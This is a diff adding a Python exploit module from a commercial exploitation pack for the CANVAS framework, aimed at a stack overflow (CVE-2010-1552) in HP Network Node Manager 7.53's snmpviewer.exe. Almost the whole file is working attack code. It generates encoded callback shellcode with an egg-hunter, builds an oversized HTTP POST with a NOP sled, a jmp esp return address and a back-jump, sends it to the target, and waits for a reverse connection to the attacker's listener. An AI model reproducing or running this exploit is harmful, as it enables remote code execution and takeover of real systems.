@@ -1,0 +1,172 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2011
+#
+
+
+import sys
+
+if "." not in sys.path: 
+	sys.path.append(".")
+
+import struct
+import canvasengine
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+from shellcode import shellcodeGenerator,win32shell
+from encoder import alphanumeric
+
+# GUI info
+NAME = "HP Network Node Manager 7.53 snmpviewer.exe act Variable Stack Overflow Vulnerability"
+
+DESCRIPTION = "Stack Overflow Vulnerability in HP Network Node Manager 7.53 snmpviewer.exe"
+
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "HP"
+DOCUMENTATION["Date public"] = "2010.05.11"
+DOCUMENTATION["VersionsAffected"] = "HP Network Node Manager version 7.53"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["References"] = "http://www.zerodayinitiative.com/advisories/ZDI-10-083/"
+DOCUMENTATION["CVE Name"] = "CVE-2010-1552"
+DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1552"
+DOCUMENTATION["Notes"] = ""
+
+VERSION = "1.0"
+
+GTK2_DIALOG = "dialog.glade2"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Windows"] ]
+PROPERTY['VERSION'] = [ "2000" ]
+
+NOTES="""
+"""
+
+CHANGELOG="""
+"""
+
+targets = {    
+    0 : [ "HP NNM 7.53 Windows (No NX)", 0x5a41656a ], # jmp esp 
+}
+
+class theexploit(tcpexploit):
+    def __init__(self):
+        tcpexploit.__init__(self)
+        self.setInfo(DESCRIPTION)
+        self.name = NAME       
+        self.port = 80
+        self.ssl = 0
+        self.version = 0
+        self.badstring = "\x00\x21\x22\x26\x3C\x3D\x3E\x5B\x5D\x5E\x60\x7C\x7E\x7F"
+        self.searchbadstring = self.badstring 
+        return
+
+
+    def neededListenerTypes(self):
+        from canvasengine import WIN32MOSDEF
+        return [WIN32MOSDEF]    
+
+
+    def createShellcode(self):
+        if self.callback:
+        	host = self.callback.ip
+        	port = self.callback.port       
+
+        encoder         = alphanumeric.AlphaNum()
+        totopc          = encoder.seh_pc()
+        getpc           = encoder.get_pc(reg='ecx')
+
+        self.shellcode = self.createHeapSafeInject(self.badstring, host, port)
+
+        self.tag1 = "D2D2"
+        self.tag2 = "2D2D"
+
+        payload = encoder.encode(self.shellcode)
+        self.shellcode  = totopc + getpc + payload         
+        self.shellcode = self.tag2 + self.tag1 + self.shellcode
+        
+        self.searchcode = win32shell.getsearchcode(self.tag1, self.tag2)                
+        self.encodedsearchcode = self.intel_encode(self.searchbadstring, self.searchcode)
+        payload = encoder.encode(self.encodedsearchcode)
+        self.encodedsearchcode = totopc + getpc + payload 
+        
+
+    def run(self):
+        self.host = self.target.interface
+        self.port = int(self.argsDict.get("port", self.port))        
+        self.ssl = int(self.argsDict.get('ssl', self.ssl))
+        
+        self.setInfo("%s attacking %s:%d (in progress)"%(NAME, self.host, self.port))        
+        self.log("Version %d "%(self.version))     
+        self.log("Attacking %s:%d"%(self.host, self.port))
+        
+        sploitstring = self.makesploit()
+                
+        s = self.gettcpsock()
+        s.connect((self.host, self.port))
+                
+        self.websend(s, sploitstring)
+
+        ret = self.ISucceeded()
+        
+        if not ret:
+        	self.log("Sleeping for two seconds to check for callback")
+        	time.sleep(2)
+        	ret = self.ISucceeded()        
+
+        if ret:
+        	self.setInfo("%s attacking %s:%d (succeeded!)" % (self.name, self.host, self.port), showlog=True)
+        	self.log("%s done (succeeded!)" % self.name)            
+        
+        return ret
+        
+        
+    def makesploit(self):	
+        print len(self.shellcode)						
+    	os_name, call_esp = targets[self.version]
+
+    	ret = struct.pack('<L', call_esp)     				   	    	
+
+        sc = "\x90"*0x45f
+        sc = sc[0:150] + self.encodedsearchcode + sc[150 + len(self.encodedsearchcode):]
+            	
+        data = self.shellcode + "=D2D2D2D2D2D2&ins=content&act=" + sc + "\x90\x90\xeb\x20" + ret + "A"*28 + "\xe9\xfb\xfb\xff\xff" + "A"*0x7c7    	
+        
+        			    	    	    		
+    	buff =  "POST /OvCgi/snmpviewer.exe HTTP/1.0\r\n"    	
+    	buff += "Host: " + self.host + "\r\n"    	    	
+    	buff += "Content-Length: " + str(len(data)) + "\r\n"
+    	buff += "\r\n"
+    	buff += data
+
+    	sploitstring = buff
+    	    	
+    	return sploitstring
+      
+        		
+    def displayVersions(self):
+    	i = 0
+    	print 'Available versions:'
+    	for listline in targets.values():
+    		print "\t%d: %s" % (i,listline[0])
+    		i += 1
+
+
+    def usage(self):
+    	print "Usage: %s -v version -t targethost -p port -l localip -d localport [-O ssl:0|1]\n" % (sys.argv[0])
+    	self.displayVersions()
+    	sys.exit(0)
+
+
+if __name__ == '__main__':
+    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
+    app = theexploit()
+    ret = standard_callback_commandline(app)
